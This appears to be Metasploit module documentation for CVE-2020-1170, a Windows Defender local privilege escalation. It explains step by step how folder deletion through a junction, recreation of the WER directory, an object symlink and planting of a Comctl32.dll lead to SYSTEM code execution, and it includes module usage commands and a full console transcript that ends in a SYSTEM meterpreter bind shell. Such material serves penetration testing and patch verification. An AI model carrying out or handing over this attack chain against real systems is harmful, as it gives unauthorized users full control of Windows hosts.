## Vulnerable Application

An arbitrary folder deletion vulnerability exists in Windows Defender's MpCmdRun.exe binary on MpCmdRun.exe versions prior to 4.18.2005.1.
The vulnerability occurs due to the fact that these versions of Windows Defender did not apply impersonation when copying log files of
16 MB or greater from C:\Windows\Temp\MpCmdRun.log to C:\Windows\Temp\MpCmdRun.log.bak. By creating a junction directory named
C:\Windows\Temp\MpCmdRun.log.bak, and then filling the contents of C:\Windows\Temp\MpCmdRun.log so that it is greater than 16 MB in size,
attackers can delete an arbitrary folder and its contents as the SYSTEM user.

To turn this into a LPE vulnerabilty, attackers can utilize a flaw within the Windows Error Reporting service, as described by @jonaslyk
of secret.club, whereby if the C:\ProgramData\Microsoft\Windows\WER directory does not exist (which is not normally the case), and a WER
error report is submitted, then the program C:\Windows\System32\wermgr.exe will run as SYSTEM and will create the
C:\ProgramData\Microsoft\Windows\WER directory with permissions that allow all users to access it.

This, in combination with the Windows Defender bug, allows an attacker to delete the C:\ProgramData\Microsoft\Windows\WER directory and
submit a WER error report to have it recreated with permissions that allow all authenticated users to READ, WRITE and DELETE files
contained within it. Following this, the attacker will then clear out the C:\ProgramData\Microsoft\Windows\WER directory and will
turn it into a directory junction that points to \RPC Control. Once this is done, they will then create a symbolic object link at
\RPC Control\Temp which points to \??\c:\windows\system32\wermgr.exe.local. Finally they will submit another WER error report to
cause the C:\Windows\System32\wermgr.exe.local directory to be created with permissions that allow all authenticated users to READ,
WRITE and DELETE files contained within it.

Now that C:\Windows\System32\wermgr.exe.local has finally been created with the right permissions the attacker can create the folder
C:\Windows\System32\wermgr.exe.local\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8
and plant a malicious DLL named Comctl32.dll within it. This path is checked whenever MpCmdRun.exe is run, and if it exists,
the Comctl32.dll DLL will be loaded into MpCmdRun.exe, which will be running as SYSTEM.

As this point all the attacker has to do is delete the C:\ProgramData\Microsoft\Windows\WER directory, which ensures that
MpCmdRun.exe will run as SYSTEM and not as the user running the command, and then the malicious Comctl32.dll file will be
loaded into the MpCmdRun.exe process, which will grant the attacker SYSTEM level arbitrary code execution on the affected
host.

This module has been tested with Windows 10 v1909 x64 running MpCmdRun.exe version 4.18.1902.5. Note that this code
uses the NtApiDotNet.dll library, version 1.1.28, which is taken directly from
https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/releases/tag/v1.1.28 as despite our best attempts,
it was not possible to get the file oplock code from this DLL ported into the framework via either PowerShell
or Railgun (both which had their own issues when it came to file oplocks). RDLLs were an option but considering we are
already dropping files on the host, it was decided that it was best to just drop the NtApiDotNet DLL, load this via
PowerShell, run the required operations, and then clean up this DLL and the other artifacts once we are done.

### Installation And Setup
All affected systems should have the Windows Defender installed. You will however need to make sure that no other
AV is active on the target system, or Windows Defender will be disabled. The exploit has a check for this in case
you forget though so you can check if Windows Defender is disabled or not. Testers will also need to be careful as
once Windows Defender is updated, there is no way to downgrade it again.

For these reasons testers are recommended to use a clean installation of Windows 10 v1903 or Windows 10 v1909, which should have
everything needed to test out this issue, and ensure that the target does not receive any updates. Just be sure that
the installed version of MpCmdRun.exe is a version prior to 4.18.2005.1.

## Verification Steps

1. Get a non-SYSTEM meterpreter session on any target running Windows Defender with no other AV active,
   and which has a MpCmdRun.exe file version of 4.18.2004.6 or earlier.
2. `use exploit/windows/local/cve_2020_1170_windows_defender_lpe.rb`
3. `set session <session>`
4. `set RHOST <target ip>`
5. `set LPORT <port to open on target>`
4. `exploit`
5. Verify that you get a new shell running as SYSTEM

## Options
  ### WaitTime
  Time to wait for file writes to complete before clearing the WER directory. On slower
  systems or those with lots of file activity, it is recommended to increase this number.

  ### WritableDir
  A directory that the current user can write to which will be used to store the contents of
  all the files and directories moved out of C:\ProgramData\Microsoft\Windows\WER so it can be
  deleted or turned into a directory junction when needed.

## Scenarios

### Windows 10 v1903 x64 with MpCmdRun.exe version 4.18.1902.5

```
msf5 > use exploit/windows/local/cve_2020_1170_windows_defender_lpe
[*] Using configured payload windows/x64/meterpreter/bind_tcp
msf5 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > set SESSION 17
SESSION => 17
msf5 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > set PAYLOAD windows/x64/meterpreter/bind_tcp
PAYLOAD => windows/x64/meterpreter/bind_tcp
msf5 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > set LPORT 6655
LPORT => 6655
msf5 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > set RHOST 169.254.162.16
RHOST => 169.254.162.16
msf5 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > show options

Module options (exploit/windows/local/cve_2020_1170_windows_defender_lpe):

   Name         Current Setting   Required  Description
   ----         ---------------   --------  -----------
   SESSION      17                yes       The session to run this module on.
   WaitTime     30                yes       Number of seconds to wait for background file writes to complete before clearing the WER directory
   WritableDir  C:\Windows\Temp\  yes       The location of a directory the current user can write to


Payload options (windows/x64/meterpreter/bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LPORT     6655             yes       The listen port
   RHOST     169.254.162.16   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Windows DLL Dropper

msf5 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > exploit

[*] Executing automatic check (disable AutoCheck to override)
[+] C:\Windows\Temp\MpCmdRun.log.bak doesn't exist on the target!
[*] Version 4.18.1902.5 of MpCmdRun.exe detected on target!
[+] Target appears to have an outdated version of MpCmdRun.exe that is being actively used.
[+] The target appears to be vulnerable.
[*] Uploading the PowerShell file that will run the main exploit along with the DLL to support its operations...
[+] Uploaded necessary files and registered them for cleanup!
[*] Moving folders out of C:\ProgramData\Microsoft\Windows\WER so that we can delete the folder...
[*] Making the temp folder which will house the folders that we move out of the WER directory...
[*] cd'ing to relocation directory and relocating the folders...
[*] Moving files out of the WER directory into the relocation directory...
[*] Changing directory back to the writable directory...
[+] Successfully moved the folders out of C:\ProgramData\Microsoft\Windows\WER!
[*] Triggering the vulnerability, this usually takes about 40 to 60 minutes to complete...
[+] Successfully triggered the arbitrary file deletion vulnerability!
[*] Sleeping for 30 seconds to ensure any extra operations on the WER directory go through before we try and clear it up.
[*] Moving folders out of C:\ProgramData\Microsoft\Windows\WER so that it can be turned into a directory junction...
[*] Making the temp folder which will house the folders that we move out of the WER directory...
[*] cd'ing to relocation directory and relocating the folders...
[*] Moving files out of the WER directory into the relocation directory...
[*] Changing directory back to the writable directory...
[+] Successfully moved the folders out of C:\ProgramData\Microsoft\Windows\WER!
[*] Creating the directory junction...
[+] Created the directory junction successfully!
[+] Created the symbolic link between \RPC Control\Temp and \??\c:\windows\system32\wermgr.exe.local successfully!
[*] Starting the WER job to create the C:\Windows\System32\wermgr.exe.local directory...
[+] Successfully created the WER job!
[*] Closing symbolic link handle...
[+] Closed symlink handle!
[*] Cleaning up by removing the WER junction directory...
[+] Removed the WER junction directory!
[+] Successfully created C:\Windows\System32\wermgr.exe.local\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.778_none_e6c6b761130d4fb8
[*] Uploading malicious DLL as Comctl32.dll to created directory for a DLL planting attack...
[+] Successfully uploaded the malicious Comctl32.dll file!
[*] Starting the WER job to gain a shell...
[+] Successfully created the WER job!
[*] All done!
[!] Be sure to remove C:\Windows\Temp\MpCmdRun.log.bak manually from within a normal command shell!
[!] You can do this by running `shell`, then typing `del C:\Windows\Temp\MpCmdRun.log.bak`
[*] Started bind TCP handler against 169.254.162.16:6655
[*] Sending stage (201283 bytes) to 169.254.162.16
[*] Meterpreter session 19 opened (0.0.0.0:0 -> 169.254.162.16:6655) at 2020-07-22 16:30:40 -0500
[+] Deleted C:\Windows\Temp\\FKYhtZaobB
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-EMAVUN1
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 19...
msf5 exploit(windows/local/cve_2020_1170_windows_defender_lpe) > sessions

Active sessions
===============

  Id  Name  Type                     Information                             Connection
  --  ----  ----                     -----------                             ----------
  17        meterpreter x64/windows  DESKTOP-EMAVUN1\test @ DESKTOP-EMAVUN1  0.0.0.0:0 -> 169.254.162.16:4444 (169.254.162.16)
  19        meterpreter x64/windows  NT AUTHORITY\SYSTEM @ DESKTOP-EMAVUN1   0.0.0.0:0 -> 169.254.162.16:6655 (169.254.162.16)
```
